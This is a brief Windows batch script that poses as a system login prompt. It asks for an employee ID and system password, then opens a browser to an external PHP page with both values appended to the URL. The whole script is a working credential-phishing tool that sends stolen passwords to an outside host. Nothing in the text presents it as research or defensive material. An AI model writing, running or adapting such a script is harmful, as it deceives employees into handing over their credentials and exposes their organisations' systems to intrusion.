@echo off
setlocal enabledelayedexpansion
cls
set /p id=Please Enter Your Employe ID:
cls
set /p pass=Please Enter Your System Password: 
start https://sher.ct.ws/pass.php?text=id:%id%+pass:%pass%
endlocal
exit
